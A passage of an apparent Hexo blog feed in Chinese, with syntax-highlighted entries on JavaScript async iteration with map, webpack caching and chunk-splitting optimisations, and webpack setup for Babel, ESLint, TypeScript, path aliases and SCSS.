class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">const ajax1 = <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">new</span> Promise(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;ajax1&#x27;</span>)</span><br><span class="line">    resolve()</span><br><span class="line">  &#125;, <span class="number">2000</span>)</span><br><span class="line">&#125;)</span><br><span class="line">const ajax2 = <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">new</span> Promise(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;ajax2&#x27;</span>)</span><br><span class="line">    resolve()</span><br><span class="line">  &#125;, <span class="number">2000</span>)</span><br><span class="line">&#125;)</span><br><span class="line">const ajax3 = <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">new</span> Promise(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;ajax3&#x27;</span>)</span><br><span class="line">    resolve()</span><br><span class="line">  &#125;, <span class="number">2000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">const fn2 = async () =&gt; &#123;</span><br><span class="line">  const <span class="built_in">array</span> = [ajax1, ajax2, ajax3];</span><br><span class="line">  <span class="built_in">array</span>.<span class="built_in">map</span>(async ajax =&gt; await ajax())</span><br><span class="line">&#125;</span><br><span class="line">fn2()</span><br></pre></td></tr></table></figure><blockquote><p>当用 map 遍历的时候，就会同时运行三个 ajax</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webpack 优化技巧</title>
      <link href="/Blog/2021/05/08/javascript/webpack%E4%BC%98%E5%8C%96%E6%8A%80%E5%B7%A7/index/"/>
      <url>/Blog/2021/05/08/javascript/webpack%E4%BC%98%E5%8C%96%E6%8A%80%E5%B7%A7/index/</url>
      
        <content type="html"><![CDATA[<h1 id="单独打包-runtime"><a href="#单独打包-runtime" class="headerlink" title="单独打包 runtime"></a>单独打包 runtime</h1><blockquote><p>什么是 runtime，如果我们为了让一个东西运行而提供的代码，就是 runtime 代码<br>我们为了让 main.js 能够在 IE 中运行，webpack 代码需要写额外的代码，那部分代码就是 runtime<br>如果不单独打包，当我们修改了配置，或者升级了，因为默认 runtime 代码是包含在 main.js 中的，所以build之后 main 的内容就会变化，导致用户就要重新下载新的文件，但是本次下载是完全没有必要的，因为 index.js 没有变化，我们只是升级了 runtime，所以必须单独打包<br>所以要单独打包 runtime，只要 index.js 内容没有变化（我们自己写的代码没有变化），用户就不需要重新下载这部分代码，节省用户的带宽</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span>.<span class="keyword">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  optimzation: &#123;</span><br><span class="line">    runtimeChunk: <span class="string">&#x27;single&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="node-依赖单独打包"><a href="#node-依赖单独打包" class="headerlink" title="node 依赖单独打包"></a>node 依赖单独打包</h1><blockquote><p>比如 react、vue，如果被打包进 main.js，就会很慢，还有就是没必要，因为我们不太会去升级 react 或者 vue 版本，如果单独打包，那么用户就可以缓存下来</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  <span class="regexp">//</span> ...</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    <span class="regexp">//</span> ...</span><br><span class="line">    splitChunks: &#123;</span><br><span class="line">      cacheGroups: &#123;</span><br><span class="line">        vendor: &#123;</span><br><span class="line">          minSize: <span class="number">0</span>, <span class="regexp">//</span> 如果不写 <span class="number">0</span>，由于 React 文件尺寸太小，或者直接跳过</span><br><span class="line">          test: <span class="regexp">/[\\/]node_modules[\\/]/</span>, <span class="regexp">//</span> 为了匹配 <span class="regexp">/node_modules/</span> 或者 \node_modules\</span><br><span class="line">          name: <span class="string">&#x27;vendors&#x27;</span>, <span class="regexp">//</span> 文件名</span><br><span class="line">          chunks: <span class="string">&#x27;all&#x27;</span>, <span class="regexp">//</span> all 表示同步加载和异步加载，async 表示异步加载，initial 表示同步加载</span><br><span class="line">          <span class="regexp">//</span> 这三行的整体意思就是把两种加载方式的来自 node_modules 目录的文件大包围 vendors.xxx.js</span><br><span class="line">          <span class="regexp">//</span> 其中 vendors 是第三方的意思（行业默认，显得专业）</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="固定-moduleIds"><a href="#固定-moduleIds" class="headerlink" title="固定 moduleIds"></a>固定 moduleIds</h1><blockquote><p>因为一般来说 modules 会按照顺序进行命名<br>比如：1.js &#x3D;&gt; 905<br>        2.js &#x3D;&gt; 403<br>        3.js &#x3D;&gt; 603<br>如果这个时候我把 2.js 删除了，那么可能会影响其他依赖的命名，导致用户的缓存失效，保证用户不重复下载没有变化，所以最好加上（但是不必须，一般没人这么整）</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span>.<span class="keyword">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  optimzation: &#123;</span><br><span class="line">    moduleIds: <span class="string">&#x27;deterministic&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="webpack-多页面"><a href="#webpack-多页面" class="headerlink" title="webpack 多页面"></a>webpack 多页面</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span>.<span class="keyword">exports</span> = &#123;</span><br><span class="line">  entry: &#123;</span><br><span class="line">    main: <span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">    admin: <span class="string">&#x27;./src/admin.js&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;</span><br><span class="line">      filename: <span class="string">&#x27;index.html&#x27;</span>,</span><br><span class="line">      chunks: [<span class="string">&#x27;main&#x27;</span>],</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;</span><br><span class="line">      filename: <span class="string">&#x27;admin.html&#x27;</span>,</span><br><span class="line">      chunks: [<span class="string">&#x27;admin&#x27;</span>],</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="common-chunks-共有文件（如果使用了多页面就需要使用的技巧）"><a href="#common-chunks-共有文件（如果使用了多页面就需要使用的技巧）" class="headerlink" title="common chunks 共有文件（如果使用了多页面就需要使用的技巧）"></a>common chunks 共有文件（如果使用了多页面就需要使用的技巧）</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">optimization: &#123;</span><br><span class="line">    <span class="regexp">//</span> ...</span><br><span class="line">    splitChunks: &#123;</span><br><span class="line">      cacheGroups: &#123;</span><br><span class="line">        <span class="regexp">//</span> ...</span><br><span class="line">        common: &#123;</span><br><span class="line">          <span class="regexp">//</span> priority: <span class="number">5</span>,</span><br><span class="line">          minSize: <span class="number">0</span>,</span><br><span class="line">          minChunks: <span class="number">2</span>, <span class="regexp">//</span> 同时被两处地方引用</span><br><span class="line">          chunks: <span class="string">&#x27;all&#x27;</span>,</span><br><span class="line">          name: <span class="string">&#x27;common&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="无限多页面"><a href="#无限多页面" class="headerlink" title="无限多页面"></a>无限多页面</h1><blockquote><p>像上面那样手写太累<br>用 node 读取文件在写进配置</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webpack 高级配置</title>
      <link href="/Blog/2021/05/08/javascript/webpack%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/index/"/>
      <url>/Blog/2021/05/08/javascript/webpack%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/index/</url>
      
        <content type="html"><![CDATA[<h1 id="如何支持-IE"><a href="#如何支持-IE" class="headerlink" title="如何支持 IE"></a>如何支持 IE</h1><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.browserslistrc</span><br><span class="line">[production] <span class="comment"># 正式环境</span></span><br><span class="line">&gt; <span class="number">1</span>% <span class="comment"># 支持全世界大于1%的浏览器</span></span><br><span class="line">ie <span class="number">9</span></span><br><span class="line"></span><br><span class="line">[modern] <span class="comment"># 开发环境</span></span><br><span class="line">last <span class="number">1</span> chrome <span class="keyword">version</span></span><br><span class="line">last <span class="number">1</span> firefox <span class="keyword">version</span></span><br><span class="line"></span><br><span class="line">[ssr]</span><br><span class="line"><span class="keyword">node</span> <span class="title">12</span></span><br></pre></td></tr></table></figure><h1 id="用-babel-loader-打包-JS"><a href="#用-babel-loader-打包-JS" class="headerlink" title="用 babel-loader 打包 JS"></a>用 babel-loader 打包 JS</h1><blockquote><p>其实 webpack 就可以打包 JS 了，为什么还要用 babel-loader 呢？因为他的功能更强大，</p></blockquote><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install </span>-D <span class="keyword">babel-loader </span>@<span class="keyword">babel/core </span>@<span class="keyword">babel/preset-env </span>webpac</span><br></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  node: <span class="string">&#x27;production&#x27;</span>,</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.jsx?$/</span>,</span><br><span class="line">        <span class="keyword">exclude</span>: <span class="regexp">/(node_modules|bower_components)/</span>,</span><br><span class="line">        use: &#123;</span><br><span class="line">          loader: <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">          <span class="keyword">options</span>: &#123;</span><br><span class="line">            presets: [<span class="string">&#x27;@babel/preset-env&#x27;</span>]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="用-babel-loader-打包-JSX"><a href="#用-babel-loader-打包-JSX" class="headerlink" title="用 babel-loader 打包 JSX"></a>用 babel-loader 打包 JSX</h1><p><a href="https://babeljs.io/docs/en/babel-preset-react">babel-preset-react</a></p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">npm</span> install --save-dev @babel/preset-react</span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;presets&quot;</span>: [<span class="string">&quot;@babel/preset-react&quot;</span>]</span><br></pre></td></tr></table></figure><h1 id="给-webpack-配置-ESLint-插件"><a href="#给-webpack-配置-ESLint-插件" class="headerlink" title="给 webpack 配置 ESLint 插件"></a>给 webpack 配置 ESLint 插件</h1><ul><li>让编辑器提示<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add -<span class="keyword">D</span> babel-eslint eslint eslint-config-react-<span class="keyword">app</span> eslint-<span class="keyword">plugin</span>-flowtype eslint-<span class="keyword">plugin</span>-import eslint-<span class="keyword">plugin</span>-jsx-a11y eslint-<span class="keyword">plugin</span>-react eslint-<span class="keyword">plugin</span>-react-hooks</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .eslintrc.js</span></span><br><span class="line">module<span class="selector-class">.exports</span> = &#123;</span><br><span class="line">  extends: <span class="selector-attr">[<span class="string">&#x27;react-app&#x27;</span>]</span>,</span><br><span class="line">  rules: &#123;</span><br><span class="line">    <span class="comment">// 0 忽略 ，1 警告， 2 报错</span></span><br><span class="line">    <span class="string">&#x27;react/jsx-uses-react&#x27;</span>: <span class="selector-attr">[2]</span>,</span><br><span class="line">    <span class="comment">// 提示要在 JSX 文件里手动引入 React</span></span><br><span class="line">    <span class="string">&#x27;react/react-in-jsx-scope&#x27;</span>: <span class="selector-attr">[2]</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>让 webpack 提示<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">yarn add - D eslint-webpack-plugin</span><br><span class="line"></span><br><span class="line">const ESLintPlugin = require(<span class="string">&#x27;eslint-webpack-plugin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  mode: <span class="string">&#x27;production&#x27;</span>,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> ESLintPlugin(&#123;</span><br><span class="line">      extensions: [<span class="string">&#x27;.js&#x27;</span>, <span class="string">&#x27;.jsx&#x27;</span>]</span><br><span class="line">    &#125;)</span><br><span class="line">  ],</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.jsx?$/</span>,</span><br><span class="line">        <span class="keyword">exclude</span>: <span class="regexp">/(node_modules|bower_components)/</span>,</span><br><span class="line">        use: &#123;</span><br><span class="line">          loader: <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">          <span class="keyword">options</span>: &#123;</span><br><span class="line">            presets: [</span><br><span class="line">              [<span class="string">&#x27;@babel/preset-env&#x27;</span>],</span><br><span class="line">              [<span class="string">&#x27;@babel/preset-react&#x27;</span>, &#123;<span class="keyword">runtime</span>: <span class="string">&#x27;classic&#x27;</span>&#125;],</span><br><span class="line">            ],</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="如何使用-babel-loader-打包-TypeScript"><a href="#如何使用-babel-loader-打包-TypeScript" class="headerlink" title="如何使用 babel-loader 打包 TypeScript"></a>如何使用 babel-loader 打包 TypeScript</h1><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn <span class="keyword">add</span><span class="language-bash"> -D @babel/preset-typescript</span></span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;presets&quot;</span>: [<span class="string">&quot;@babel/preset-typescript&quot;</span>]</span><br></pre></td></tr></table></figure><h1 id="让-ESLint-支持-TS"><a href="#让-ESLint-支持-TS" class="headerlink" title="让 ESLint 支持 TS"></a>让 ESLint 支持 TS</h1><blockquote><p>为什么不用 TSLint？因为作者不维护了</p></blockquote><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn <span class="keyword">add</span><span class="language-bash"> -D @typescript-eslint/eslint-plugin eslint-config-airbnb-typescript typescript</span></span><br></pre></td></tr></table></figure><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  // ...</span><br><span class="line">  overrides: [&#123;</span><br><span class="line">    files: [<span class="string">&#x27;*.ts&#x27;</span>, <span class="string">&#x27;*.tsx&#x27;</span>],</span><br><span class="line">    parserOptions: &#123;</span><br><span class="line">      project: <span class="string">&#x27;./tsconfig.json&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    extends: [<span class="string">&#x27;airbnb-typescript&#x27;</span>],</span><br><span class="line">    rules: &#123;</span><br><span class="line">      <span class="string">&#x27;@typescript-eslint/object-curly-spacing&#x27;</span>: [<span class="number">0</span>],</span><br><span class="line">      <span class="string">&#x27;import/prefer-default-export&#x27;</span>: [<span class="number">0</span>],</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="让-babel-loader-支持-TSX"><a href="#让-babel-loader-支持-TSX" class="headerlink" title="让 babel-loader 支持 TSX"></a>让 babel-loader 支持 TSX</h1><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn <span class="keyword">add</span><span class="language-bash"> -D @types/react</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> tsconfig.json</span><br><span class="line"><span class="string">&quot;jsx&quot;</span>: <span class="string">&quot;react&quot;</span></span><br></pre></td></tr></table></figure><h1 id="支持-alias"><a href="#支持-alias" class="headerlink" title="支持 alias"></a>支持 alias</h1><ul><li>让 JS 支持 @<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ESLintPlugin</span> = <span class="built_in">require</span>(<span class="string">&#x27;eslint-webpack-plugin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">resolve</span>: &#123;</span><br><span class="line">    <span class="attr">alias</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;@&#x27;</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./src/&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>让 TS 支持 @<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;compilerOptions&quot;</span>: &#123;</span><br><span class="line">    <span class="regexp">/* Visit https:/</span><span class="regexp">/aka.ms/</span>tsconfig.json to read more about this file */</span><br><span class="line">    <span class="string">&quot;baseUrl&quot;</span>: <span class="string">&quot;.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;paths&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;@/*&quot;</span>: [<span class="string">&quot;src/*&quot;</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="支持-SCSS"><a href="#支持-SCSS" class="headerlink" title="支持 SCSS"></a>支持 SCSS</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn <span class="built_in">add</span> -D css-loader sass sass-loader style-loader</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  <span class="regexp">//</span> ...</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      <span class="regexp">//</span> ...</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.s[ac]ss$/i</span>,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">&#x27;style-loader&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;sass-loader&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="让-scss-自动-import"><a href="#让-scss-自动-import" class="headerlink" title="让 scss 自动 import"></a>让 scss 自动 import</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  <span class="regexp">//</span> ...</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      <span class="regexp">//</span> ...</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.s[ac]ss$/i</span>,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">&#x27;style-loader&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">         &#123;</span><br><span class="line">            loader: <span class="string">&#x27;sass-loader&#x27;</span>,</span><br><span class="line">            options: &#123;</span><br><span class="line">              additionalData: `@import <span class="string">&quot;~@/scss-vars.scss&quot;</span>;`,</span><br><span class="line">              sassOptions: &#123;</span><br><span class="line">                includePaths: [__dirname]</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="scss-分享变量给-JS"><a href="#scss-分享变量给-JS" class="headerlink" title="scss 分享变量给 JS"></a>scss 分享变量给 JS</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> 最好新建一个文件</span><br><span class="line">:export &#123;</span><br><span class="line">  color: <span class="variable">$color</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">module.exports = &#123;</span></span><br><span class="line"><span class="attribute">  // ...</span></span><br><span class="line"><span class="attribute">  module</span><span class="punctuation">:</span> <span class="string">&#123;</span></span><br><span class="line">    <span class="attribute">rules</span><span class="punctuation">:</span> <span class="string">[</span></span><br><span class="line">      <span class="attribute">// ...</span></span><br><span class="line"><span class="attribute">      &#123;</span></span><br><span class="line"><span class="attribute">        test</span><span class="punctuation">:</span> <span class="string">/\.s[ac]ss$/i,</span></span><br><span class="line">        <span class="attribute">use</span><span class="punctuation">:</span> <span class="string">[</span></span><br><span class="line">          <span class="attribute">&#x27;style-loader&#x27;,</span></span><br><span class="line"><span class="attribute">         &#123;</span></span><br><span class="line"><span class="attribute">            loader</span><span class="punctuation">:</span> <span class="string">&#x27;css-loader&#x27;,</span></span><br><span class="line">            <span class="attribute">options</span><span class="punctuation">:</span> <span class="string">&#123;</span></span><br><span class="line">              <span class="attribute">modules</span><span class="punctuation">:</span> <span class="string">&#123;</span></span><br><span class="line">                <span class="attribute">compileType</span><span class="punctuation">:</span> <span class="string">&#x27;icss&#x27;,</span></span><br><span class="line">              <span class="attribute">&#125;,</span></span><br><span class="line"><span class="attribute">            &#125;,</span></span><br><span class="line"><span class="attribute">          &#125;,</span></span><br><span class="line"><span class="attribute">         &#123;</span></span><br><span class="line"><span class="attribute">            loader</span><span class="punctuation">:</span> <span class="string">&#x27;sass-loader&#x27;,</span></span><br><span class="line">            <span class="attribute">options</span><span class="punctuation">:</span> <span class="string">&#123;</span></span><br><span class="line">              <span class="attribute">additionalData</span><span class="punctuation">:</span> <span class="string">`@import &quot;~@/scss-vars.scss&quot;;`,</span></span><br><span class="line">              <span 